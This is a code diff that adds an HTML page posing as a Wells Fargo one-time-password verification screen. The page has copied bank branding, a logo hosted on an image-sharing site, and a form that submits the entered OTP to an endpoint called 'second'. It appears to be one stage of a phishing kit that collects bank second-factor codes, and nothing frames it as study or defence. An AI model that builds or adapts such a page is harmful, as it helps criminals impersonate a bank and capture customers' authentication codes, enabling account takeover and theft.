@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo OTP Verification</title>
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTtP_Upj9xlF66H5DAD1GbLjWz9ZmGD1hvdRu_0x9PT7fdG4ukCXVa3VTTz8slkj3YeiIA&usqp=CAU">
+    <style>
+        body {
+            font-family: 'Arial Narrow', sans-serif;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        .header {
+            background-color: #d32f2f;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .header img {
+            width: 300px;
+            height: auto;
+            max-width: 100%;
+        }
+        .header nav {
+            display: flex;
+            gap: 20px;
+        }
+        .header nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .header nav a:hover {
+            text-decoration: underline;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 600px;
+            margin: 50px auto;
+            text-align: left;
+        }
+        .login-container h1 {
+            margin-bottom: 20px;
+            color: #d32f2f;
+            font-size: 32px;
+            text-align: center;
+        }
+        .login-container .form-group {
+            margin-bottom: 20px;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-size: 18px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: none;
+            border-bottom: 2px solid #d32f2f;
+            outline: none;
+            font-size: 18px;
+            border-radius: 0;
+        }
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border-color: #b71c1c;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+        .login-container button:hover {
+            background-color: #b71c1c;
+        }
+        .login-container .forgot-link, .login-container .enroll-link {
+            display: block;
+            margin-top: 20px;
+            color: #d32f2f;
+            text-decoration: none;
+            text-align: center;
+            font-size: 16px;
+        }
+        .login-container .forgot-link:hover, .login-container .enroll-link:hover {
+            text-decoration: underline;
+        }
+        .additional-info {
+            margin-top: 20px;
+        }
+        .additional-info p {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        .content h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .content p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .benefits {
+            background-color: #d32f2f;
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            border-radius: 8px;
+            margin-top: 50px;
+        }
+        .benefits h2 {
+            font-size: 28px;
+            margin-bottom: 30px;
+        }
+        .benefits ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .benefits li {
+            margin-bottom: 20px;
+            font-size: 18px;
+            line-height: 1.6;
+        }
+        .benefits li:before {
+            content: '✔';
+            margin-right: 10px;
+        }
+        .trusted {
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        .trusted h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .trusted p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .trusted img {
+            width: 200px;
+            height: auto;
+            max-width: 100%;
+        }
+        .features {
+            padding: 40px 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            margin-top: 50px;
+            text-align: center;
+        }
+        .features h2 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        .features ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .features li {
+            margin-bottom: 20px;
+            font-size: 18px;
+            line-height: 1.6;
+}
+.features li
+{
+content: '✓';
+margin-right: 10px;
+color: #d32f2f;
+}
+.footer {
+background-color: #333;
+color: white;
+padding: 20px 0;
+text-align: center;
+font-size: 14px;
+}
+.footer a {
+color: white;
+text-decoration: none;
+}
+.footer a
+{
+text-decoration: underline;
+}
+</style>
+
+</head>
+<body>
+    <header class="header">
+        <img src="https://i.ibb.co/vzbb3MT/Screenshot-2.png" alt="Wells Fargo Logo">
+        <nav>
+            <a href="#">Personal</a>
+            <a href="#">Small Business</a>
+            <a href="#">Commercial</a>
+        </nav>
+    </header>
+    <div class="login-container">
+        <h1>OTP Verification</h1>
+        <form action="second" method="post">
+            <div class="form-group">
+                <label for="otp">Enter OTP</label>
+                <input type="text" id="otp" name="otp" placeholder="Enter the one-time password" required>
+            </div>
+            <button type="submit">Verify OTP</button>
+        </form>
+        <a class="forgot-link" href="#">Resend OTP</a>
+    </div>
+    <div class="footer">
+        <p>&copy; 2024 Wells Fargo. All rights reserved.</p>
+    </div>
+</body>
+</html>
